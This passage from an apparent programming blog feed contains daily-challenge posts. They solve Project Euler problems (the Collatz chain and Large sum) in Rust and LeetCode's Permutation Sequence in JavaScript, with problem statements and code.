million.</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Brute force, and you&#39;ll find that every number less than half a million can be get with its double, and therefore in a definitely longer chain.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">500_000u64</span>..<span class="number">1_000_000u64</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tmp = i;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tcnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> tmp != <span class="number">1</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> tmp%<span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">                tmp /=<span class="number">2</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tmp = tmp * <span class="number">3</span> + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            tcnt += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> tcnt &gt; cnt &#123;</span><br><span class="line">            ans = i;</span><br><span class="line">            cnt = tcnt;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">60. Permutation Sequence</span><br><span class="line"></span><br><span class="line">The set [1,2,3,...,n] contains a total of n! unique permutations.</span><br><span class="line"></span><br><span class="line">By listing and labeling all of the permutations in order, we get the following sequence for n = 3:</span><br><span class="line"></span><br><span class="line">&quot;123&quot;</span><br><span class="line">&quot;132&quot;</span><br><span class="line">&quot;213&quot;</span><br><span class="line">&quot;231&quot;</span><br><span class="line">&quot;312&quot;</span><br><span class="line">&quot;321&quot;</span><br><span class="line">Given n and k, return the kth permutation sequence.</span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line"></span><br><span class="line">Given n will be between 1 and 9 inclusive.</span><br><span class="line">Given k will be between 1 and n! inclusive.</span><br><span class="line">Example 1:</span><br><span class="line"></span><br><span class="line">Input: n = 3, k = 3</span><br><span class="line">Output: &quot;213&quot;</span><br><span class="line">Example 2:</span><br><span class="line"></span><br><span class="line">Input: n = 4, k = 9</span><br><span class="line">Output: &quot;2314&quot;</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>I&#39;m too tired doing my project to explain it...</p><p>Sry for delay.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; n</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; k</span></span><br><span class="line"><span class="comment"> * @return &#123;string&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> getPermutation = <span class="function"><span class="keyword">function</span>(<span class="params">n, k</span>) </span>&#123;</span><br><span class="line">  k -= <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">let</span> fac = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">120</span>, <span class="number">720</span>, <span class="number">5040</span>, <span class="number">40320</span>, <span class="number">369880</span>];</span><br><span class="line">  <span class="keyword">let</span> used = <span class="keyword">new</span> <span class="built_in">Array</span>(n);</span><br><span class="line">  <span class="keyword">let</span> nums = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">  <span class="keyword">let</span> ans = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= n ; ++i)&#123;</span><br><span class="line">    nums.push(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> cur = n - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(cur &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> index = <span class="built_in">Math</span>.floor(k/fac[cur]);</span><br><span class="line">    k %= fac[cur];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> [i, v] <span class="keyword">of</span> nums.entries())&#123;</span><br><span class="line">      <span class="keyword">if</span>(used[i] === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(index) --index;</span><br><span class="line">        <span class="keyword">else</span> &#123;ans += v; used[i] = <span class="number">1</span>; <span class="keyword">break</span>;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    --cur;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(getPermutation(3,3));</span></span><br><span class="line"><span class="comment">// console.log(getPermutation(4,9));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-02 Daily Challenge</title>
      <link href="/2019-01-02-Daily-Challenge/"/>
      <url>/2019-01-02-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Large sum</em> in <em>Rust</em> and <em>Subdomain Visit Count</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">Large sum</span><br><span class="line"></span><br><span class="line">Problem 13 </span><br><span class="line"></span><br><span class="line">Work out the first ten digits of the sum of the following one-hundred 50-digit numbers.</span><br><span class="line"></span><br><span class="line">37107287533902102798797998220837590246510135740250</span><br><span class="line">46376937677490009712648124896970078050417018260538</span><br><span class="line">74324986199524741059474233309513058123726617309629</span><br><span class="line">91942213363574161572522430563301811072406154908250</span><br><span class="line">23067588207539346171171980310421047513778063246676</span><br><span class="line">89261670696623633820136378418383684178734361726757</span><br><span class="line">28112879812849979408065481931592621691275889832738</span><br><span class="line">44274228917432520321923589422876796487670272189318</span><br><span class="line">47451445736001306439091167216856844588711603153276</span><br><span class="line">70386486105843025439939619828917593665686757934951</span><br><span class="line">62176457141856560629502157223196586755079324193331</span><br><span class="line">64906352462741904929101432445813822663347944758178</span><br><span class="line">92575867718337217661963751590579239728245598838407</span><br><span class="line">58203565325359399008402633568948830189458628227828</span><br><span class="line">80181199384826282014278194139940567587151170094390</span><br><span class="line">35398664372827112653829987240784473053190104293586</span><br><span class="line">86515506006295864861532075273371959191420517255829</span><br><span class="line">71693888707715466499115593487603532921714970056938</span><br><span class="line">54370070576826684624621495650076471787294438377604</span><br><span class="line">53282654108756828443191190634694037855217779295145</span><br><span class="line">36123272525000296071075082563815656710885258350721</span><br><span class="line">45876576172410976447339110607218265236877223636045</span><br><span class="line">17423706905851860660448207621209813287860733969412</span><br><span class="line">81142660418086830619328460811191061556940512689692</span><br><span class="line">51934325451728388641918047049293215058642563049483</span><br><span class="line">62467221648435076201727918039944693004732956340691</span><br><span class="line">15732444386908125794514089057706229429197107928209</span><br><span class="line">55037687525678773091862540744969844508330393682126</span><br><span class="line">18336384825330154686196124348767681297534375946515</span><br><span class="line">80386287592878490201521685554828717201219257766954</span><br><span class="line">78182833757993103614740356856449095527097864797581</span><br><span class="line">16726320100436897842553539920931837441497806860984</span><br><span class="line">48403098129077791799088218795327364475675590848030</span><br><span class="line">87086987551392711854517078544161852424320693150332</span><br><span class="line">59959406895756536782107074926966537676326235447210</span><br><span class="line">69793950679652694742597709739166693763042633987085</span><br><span class="line">41052684708299085211399427365734116182760315001271</span><br><span class="line">65378607361501080857009149939512557028198746004375</span><br><span class="line">35829035317434717326932123578154982629742552737307</span><br><span class="line">94953759765105305946966067683156574377167401875275</span><br><span class="line">88902802571733229619176668713819931811048770190271</span><br><span class="line">25267680276078003013678680992525463401061632866526</span><br><span class="line">36270218540497705585629946580636237993140746255962</span><br><span class="line">24074486908231174977792365466257246923322810917141</span><br><span class="line">91430288197103288597806669760892938638285025333403</span><br><span class="line">34413065578016127815921815005561868836468420090470</span><br><span class="line">23053081172816430487623791969842487255036638784583</span><br><span class="line">11487696932154902810424020138335124462181441773470</span><br><span class="line">63783299490636259666498587618221225225512486764533</span><br><span class="line">67720186971698544312419572409913959008952310058822</span><br><span class="line">95548255300263520781532296796249481641953868218774</span><br><span class="line">76085327132285723110424803456124867697064507995236</span><br><span class="line">37774242535411291684276865538926205024910326572967</span><br><span class="line">23701913275725675285653248258265463092207058596522</span><br><span class="line">29798860272258331913126375147341994889534765745501</span><br><span class="line">18495701454879288984856827726077713721403798879715</span><br><span class="line">38298203783031473527721580348144513491373226651381</span><br><span class="line">34829543829199918180278916522431027392251122869539</span><br><span class="line">40957953066405232632538044100059654939159879593635</span><br><span class="line">29746152185502371307642255121183693803580388584903</span><br><span class="line">41698116222072977186158236678424689157993532961922</span><br><span class="line">62467957194401269043877107275048102390895523597457</span><br><span class="line">23189706772547915061505504953922979530901129967519</span><br><span class="line">86188088225875314529584099251203829009407770775672</span><br><span class="line">11306739708304724483816533873502340845647058077308</span><br><span class="line">82959174767140363198008187129011875491310547126581</span><br><span class="line">97623331044818386269515456334926366572897563400500</span><br><span class="line">42846280183517070527831839425882145521227251250327</span><br><span class="line">55121603546981200581762165212827652751691296897789</span><br><span class="line">32238195734329339946437501907836945765883352399886</span><br><span class="line">75506164965184775180738168837861091527357929701337</span><br><span class="line">62177842752192623401942399639168044983993173312731</span><br><span class="line">32924185707147349566916674687634660915035914677504</span><br><span class="line">99518671430235219628894890102423325116913619626622</span><br><span class="line">73267460800591547471830798392868535206946944540724</span><br><span class="line">76841822524674417161514036427982273348055556214818</span><br><span class="line">97142617910342598647204516893989422179826088076852</span><br><span class="line">87783646182799346313767754307809363333018982642090</span><br><span class="line">10848802521674670883215120185883543223812876952786</span><br><span class="line">71329612474782464538636993009049310363619763878039</span><br><span class="line">62184073572399794223406235393808339651327408011116</span><br><span class="line">66627891981488087797941876876144230030984490851411</span><br><span class="line">60661826293682836764744779239180335110989069790714</span><br><span class="line">85786944089552990653640447425576083659976645795096</span><br><span class="line">66024396409905389607120198219976047599490197230297</span><br><span class="line">64913982680032973156037120041377903785566085089252</span><br><span class="line">16730939319872750275468906903707539413042652315011</span><br><span class="line">94809377245048795150954100921645863754710598436791</span><br><span class="line">78639167021187492431995700641917969777599028300699</span><br><span class="line">15368713711936614952811305876380278410754449733078</span><br><span class="line">40789923115535562561142322423255033685442488917353</span><br><span class="line">44889911501440648020369068063960672322193204149535</span><br><span class="line">41503128880339536053299340368006977710650566631954</span><br><span class="line">81234880673210146739058568557934581403627822703280</span><br><span class="line">82616570773948327592232845941706525094512325230608</span><br><span class="line">22918802058777319719839450180888072429661980811197</span><br><span class="line">77158542502016545090413245809786882778948721859617</span><br><span class="line">72107838435069186155435662884062257473692284509516</span><br><span class="line">20849603980134001723930671666823555245252804609722</span><br><span class="line">53503534226472524250874054075591789781264330331690</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Rust don&#39;t support slice towards unknown size string, so...</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_bigint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> num_bigint::BigInt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> nums = [b"<span class="number">37107287533902102798797998220837590246510135740250</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">46376937677490009712648124896970078050417018260538</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">74324986199524741059474233309513058123726617309629</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">91942213363574161572522430563301811072406154908250</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">23067588207539346171171980310421047513778063246676</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">89261670696623633820136378418383684178734361726757</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">28112879812849979408065481931592621691275889832738</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">44274228917432520321923589422876796487670272189318</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">47451445736001306439091167216856844588711603153276</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">70386486105843025439939619828917593665686757934951</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">62176457141856560629502157223196586755079324193331</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">64906352462741904929101432445813822663347944758178</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">92575867718337217661963751590579239728245598838407</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">58203565325359399008402633568948830189458628227828</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">80181199384826282014278194139940567587151170094390</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">35398664372827112653829987240784473053190104293586</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">86515506006295864861532075273371959191420517255829</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">71693888707715466499115593487603532921714970056938</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">54370070576826684624621495650076471787294438377604</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">53282654108756828443191190634694037855217779295145</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">36123272525000296071075082563815656710885258350721</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">45876576172410976447339110607218265236877223636045</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">17423706905851860660448207621209813287860733969412</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">81142660418086830619328460811191061556940512689692</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">51934325451728388641918047049293215058642563049483</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">62467221648435076201727918039944693004732956340691</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">15732444386908125794514089057706229429197107928209</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">55037687525678773091862540744969844508330393682126</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">18336384825330154686196124348767681297534375946515</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">80386287592878490201521685554828717201219257766954</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">78182833757993103614740356856449095527097864797581</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">16726320100436897842553539920931837441497806860984</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">48403098129077791799088218795327364475675590848030</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">87086987551392711854517078544161852424320693150332</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">59959406895756536782107074926966537676326235447210</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">69793950679652694742597709739166693763042633987085</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">41052684708299085211399427365734116182760315001271</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">65378607361501080857009149939512557028198746004375</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">35829035317434717326932123578154982629742552737307</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">94953759765105305946966067683156574377167401875275</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">88902802571733229619176668713819931811048770190271</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">25267680276078003013678680992525463401061632866526</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">36270218540497705585629946580636237993140746255962</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">24074486908231174977792365466257246923322810917141</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">91430288197103288597806669760892938638285025333403</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">34413065578016127815921815005561868836468420090470</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">23053081172816430487623791969842487255036638784583</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">11487696932154902810424020138335124462181441773470</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">63783299490636259666498587618221225225512486764533</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">67720186971698544312419572409913959008952310058822</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">95548255300263520781532296796249481641953868218774</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">76085327132285723110424803456124867697064507995236</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">37774242535411291684276865538926205024910326572967</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">23701913275725675285653248258265463092207058596522</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">29798860272258331913126375147341994889534765745501</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">18495701454879288984856827726077713721403798879715</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">38298203783031473527721580348144513491373226651381</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">34829543829199918180278916522431027392251122869539</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">40957953066405232632538044100059654939159879593635</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">29746152185502371307642255121183693803580388584903</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">41698116222072977186158236678424689157993532961922</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">62467957194401269043877107275048102390895523597457</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">23189706772547915061505504953922979530901129967519</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">86188088225875314529584099251203829009407770775672</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">11306739708304724483816533873502340845647058077308</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">82959174767140363198008187129011875491310547126581</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">97623331044818386269515456334926366572897563400500</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">42846280183517070527831839425882145521227251250327</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">55121603546981200581762165212827652751691296897789</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">32238195734329339946437501907836945765883352399886</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">75506164965184775180738168837861091527357929701337</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">62177842752192623401942399639168044983993173312731</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">32924185707147349566916674687634660915035914677504</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">99518671430235219628894890102423325116913619626622</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">73267460800591547471830798392868535206946944540724</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">76841822524674417161514036427982273348055556214818</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">97142617910342598647204516893989422179826088076852</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">87783646182799346313767754307809363333018982642090</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">10848802521674670883215120185883543223812876952786</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">71329612474782464538636993009049310363619763878039</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">62184073572399794223406235393808339651327408011116</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">66627891981488087797941876876144230030984490851411</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">60661826293682836764744779239180335110989069790714</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">85786944089552990653640447425576083659976645795096</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">66024396409905389607120198219976047599490197230297</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">64913982680032973156037120041377903785566085089252</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">16730939319872750275468906903707539413042652315011</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">94809377245048795150954100921645863754710598436791</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">78639167021187492431995700641917969777599028300699</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">15368713711936614952811305876380278410754449733078</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">40789923115535562561142322423255033685442488917353</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">44889911501440648020369068063960672322193204149535</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">41503128880339536053299340368006977710650566631954</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">81234880673210146739058568557934581403627822703280</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">82616570773948327592232845941706525094512325230608</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">22918802058777319719839450180888072429661980811197</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">77158542502016545090413245809786882778948721859617</span><span class="string">",</span></span><br><span class="line"><span class="string">b"</span><span class="number">72107838435069186155435662884062257473692284509516</span><span 